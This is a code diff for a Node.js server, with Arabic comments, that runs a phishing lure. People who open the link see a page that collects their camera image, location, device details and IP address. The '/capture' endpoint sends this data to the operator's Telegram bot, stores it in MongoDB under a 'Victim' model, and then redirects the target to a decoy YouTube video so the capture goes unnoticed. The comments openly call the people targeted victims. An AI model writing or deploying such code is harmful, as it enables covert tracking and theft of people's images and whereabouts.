@@ -1,28 +1,31 @@
-// ... الكود السابق ...
+// ... الإعدادات السابقة (express, mongoose, axios) ...
+
+// الرابط الحقيقي الذي تريد توجيه الضحية إليه (مثلاً فيديو تريند)
+const REAL_DESTINATION = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
+
+app.get('/', (req, res) => {
+    // إرسال صفحة الـ HTML التي تسحب البيانات أولاً
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
+
 app.post('/capture', async (req, res) => {
     try {
-        const { image, location } = req.body;
+        const { image, location, device } = req.body;
         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
-        // إرسال الموقع الجغرافي
-        let mapUrl = location && location.lat ? `https://www.google.com/maps?q=${location.lat},${location.lon}` : "الضحية رفضت الموقع";
+        // إرسال البيانات فوراً لتيليجرام
+        const mapUrl = location && location.lat ? `https://www.google.com/maps?q=${location.lat},${location.lon}` : "الموقع مرفوض";
+        const message = `🔗 ضحية ضغط على الرابط!\n🌐 IP: ${ip}\n📱 الجهاز: ${device}\n📍 الموقع: ${mapUrl}`;
+        
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
-            text: `🎯 صيد جديد!\n🌐 IP: ${ip}\n📍 الموقع: ${mapUrl}`
+            text: message
         });
 
-        // إرسال الصورة مباشرة للبوت إذا وجدت
-        if (image && image.includes("base64")) {
-            const buffer = Buffer.from(image.split(",")[1], 'base64');
-            const formData = new FormData();
-            formData.append('photo', buffer, { filename: 'victim.png' });
-            formData.append('chat_id', CHAT_ID);
-            formData.append('caption', `📸 صورة الضحية من IP: ${ip}`);
+        // حفظ في MongoDB كأرشيف
+        const newData = new Victim({ ip, image, location });
+        await newData.save();
 
-            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
-                headers: formData.getHeaders()
-            });
-        }
-        res.status(200).send("Sync OK");
-    } catch (e) { res.status(500).send(e.message); }
+        res.status(200).json({ redirect: REAL_DESTINATION }); // إرسال رابط التوجيه
+    } catch (e) { res.status(500).send("Error"); }
 });
